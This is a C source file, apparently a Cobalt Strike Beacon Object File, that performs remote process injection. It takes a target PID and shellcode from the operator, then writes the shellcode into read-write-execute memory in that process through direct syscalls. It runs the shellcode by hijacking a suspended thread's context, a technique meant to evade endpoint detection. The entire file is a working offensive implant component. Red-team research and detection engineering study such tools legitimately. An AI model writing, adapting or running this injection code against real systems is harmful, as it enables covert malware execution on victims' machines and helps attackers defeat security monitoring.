// Author: Chris Sikes
// Date: Apr 2021
// Credit to: XPN's SetThreadContext https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/
// Beacon Object file version with direct syscalls
#include <windows.h>
#include "beacon.h"
#include "Syscalls.h"
#include "syscalls-asm.h"


WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress (HMODULE hModule, LPCSTR lpProcName);

void go(char * argc, int len)
{
	char* shellcode;
	SIZE_T shell_len;
	datap	parser;
	HANDLE Process_Handle;
	CLIENT_ID id = {0};
	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
	PVOID Alloc = NULL;
	CONTEXT ctx;

	BeaconDataParse(&parser, argc, len);
	DWORD pid = BeaconDataInt(&parser);
	shell_len = BeaconDataLength(&parser);
	shellcode = BeaconDataExtract(&parser, NULL);
	id.UniqueProcess = pid;
	char currentDir[MAX_PATH];
	SIZE_T bytesWritten = 0;
	HANDLE threadHandle;

	NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
	NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	void *_loadLibrary = KERNEL32$GetProcAddress(LoadLibraryA("kernel32.dll"), "LoadLibraryA");
	NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
	NtCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, Process_Handle, _loadLibrary, NULL, TRUE, 0, 0, 0, NULL);

	ctx.ContextFlags = CONTEXT_CONTROL;
	NtGetContextThread(threadHandle, &ctx);
	ctx.Rip = (DWORD64)Alloc;
	NtSetContextThread(threadHandle, &ctx);
	NtResumeThread(threadHandle, NULL);

	NtClose(threadHandle);
	NtClose(Process_Handle);
}
